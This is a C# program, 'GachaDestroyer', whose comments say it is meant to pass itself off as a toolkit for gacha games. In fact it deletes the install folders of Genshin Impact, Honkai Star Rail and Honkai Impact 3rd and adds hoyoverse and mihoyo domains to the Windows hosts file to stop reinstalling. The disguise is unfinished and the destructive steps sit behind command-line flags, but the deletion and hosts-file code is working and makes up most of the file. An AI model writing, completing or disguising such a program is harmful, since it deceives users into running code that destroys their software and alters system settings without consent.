//This program claims to be a set of tools for Genshin Impact/other gacha games but instead deletes the game(s) in question and blocks domains related to them to prevent the games from being reinstalled or played again
//Currently only targets Genshin Impact, Honkai Star Rail, and Honkai Impact 3rd, which is only the tip of the iceberg
//Still working on the "claims to be a set of tools" part
/*
 * TODO:
 * Get domains and delete Honkai 3 as well
 * Have a way of searching all drives for the installation folders for the games
 */

namespace GachaDestroyer
{
    internal class Program
    {
        static void Main(String[] args)
        {
            //Hosts file path, should not need to change this
            string hosts = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), @"drivers\etc\hosts");
            string localhost = "127.0.0.1";
            string contents = File.ReadAllText(hosts);

            //Don't modify these unless you want the program to always do these things
            bool actuallyDeleteFiles = false;
            bool blockDomains = false;

            //Default Directory Paths, change these as necessary
            string GenshinDir = @"C:\Program Files\Epic Games\GenshinImpact";
            string StarRailDir = @"C:\Program Files\Epic Games\HonkaiStarRail";
            string Honkai3DirSteam = @"C:\Program Files (x86)\Steam\steamapps\common\HonkaiImpact3rd";
            string Honkai3DirEpic = @"C:\Program Files\Epic Games\HonkaiImpact3rd";

            //The strings of the domains to block. 
            string[] domainsToBlock =
            {
                "genshin.hoyoverse.com",
                "hk4e-launcher.hoyoverse.com",
                "sg-public-api-static.hoyoverse.com",
                "launcher-webstatic.hoyoverse.com",
                "sdk.hoyoverse.com",
                "sentry.eks.hoyoverse.com",
                "fastcdn.hoyoverse.com",
                "minor-api-os.hoyoverse.com",
                "starrail.hoyoverse.com",
                "abtest-api-data-sg.hoyoverse.com",
                "hkrpg-launcher-static.hoyoverse.com",
                "api-global-takumi-static.mihoyo.com",
                "sdk-os-static.hoyoverse.com",
                "hoyoverse.com",
                "mihoyo.com"
            };

            //Check if the --DELETE/--BLOCK argument is given before deleting the files/blocking domains; Idiot Proofing
            for (int i = 0; i < args.Length; i++)
            {
                //Console.WriteLine(args[i]);
                if (args[i] == "--DELETE")
                {
                    actuallyDeleteFiles = true;
                    Console.WriteLine("Deleting Files");
                }

                if (args[i] == "--BLOCK")
                {
                    blockDomains = true;
                    Console.WriteLine("Blocking Domains");
                }
            }

            //Misc stuff, change cmd to green to make it look more like the matrix and get the date/time
            string dateTime = (DateTime.Now).ToString();
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(dateTime);

            //Do the things
            Collide();
            Derail();
            Repurcussion();

            //Block the domains if the --BLOCK arg is given
            if (blockDomains) { blockDomainsToHostsFile(domainsToBlock); }

            /////////////
            //Functions//
            /////////////

            //Collide, the function that deletes Genshin.
            void Collide()
            {
                if (Directory.Exists(GenshinDir))
                {
                    Console.WriteLine("Genshin Impact Detected");
                    if (actuallyDeleteFiles) { Directory.Delete(GenshinDir); }

                    if (dateTime.Contains("8/28/"))
                    {
                        Console.WriteLine("Unhappy Birthday Genshin!");
                    }
                }
                else
                {
                    Console.WriteLine("Genshin not detected");
                }
            }

            //Derail, for removing Star Rail
            void Derail()
            {
                if (Directory.Exists(StarRailDir))
                {
                    Console.WriteLine("Star Rail Detected");
                    if (actuallyDeleteFiles) { Directory.Delete(StarRailDir); }

                    if (dateTime.Contains("4/25/") | dateTime.Contains("3/07/"))
                    {
                        Console.WriteLine("I don't know what to put except that you are probably a gambling addict and a simp.");
                    }
                }
                else
                {
                    Console.WriteLine("Honkai Star Rail not detected");
                }
            }

            //Repurcussion, for deleting Honkai 3. The reason it is named that is because it is apparently similar in meaning to impact according to the thesaurus. 
            void Repurcussion()
            {
                if (Directory.Exists(Honkai3DirEpic))
                {
                    Console.WriteLine("Honkai 3 Detected on Epic Games");
                    if (actuallyDeleteFiles) { Directory.Delete(Honkai3DirEpic); }
                }
                else
                {
                    Console.WriteLine("Honkai 3 not detected on Epic Games");
                }

                if (Directory.Exists(Honkai3DirSteam))
                {
                    Console.WriteLine("Honkai 3 Detected on Epic Games");
                    if (actuallyDeleteFiles) { Directory.Delete(Honkai3DirSteam); }
                }
                else
                {
                    Console.WriteLine("Honkai 3 not detected on Steam");
                }
            }

            //Function to block domains to the hosts file
            void blockDomainsToHostsFile(string[] domains)
            {
                bool newLined = false;
                for (int i = 0; i < domains.Length; i++)
                {
                    //Map localhost to each domain in the hosts file, also enjoy my shitty solution to there sometimes not being a newline in the hosts file
                    try
                    {
                        using (StreamWriter sw = File.AppendText(hosts))
                        {
                            if (!newLined)
                            {
                                sw.WriteLine("\n");
                                newLined = true;
                            }
                            if (checkHosts(domains[i]) == false)
                            {
                                sw.WriteLine($"{localhost} {domains[i]}");
                            }
                        }
                    }
                    catch
                    {
                        Console.WriteLine("Don't have Admin, cannot block hosts");
                        break;
                    }
                }
            }

            //Check if a domain is in the hosts file
            bool checkHosts(string domain)
            {
                if (contents.Contains(domain)) { return true; } else { return false; }
            }

            //Stop the program from exiting
            Console.ReadLine();
        }
    }
}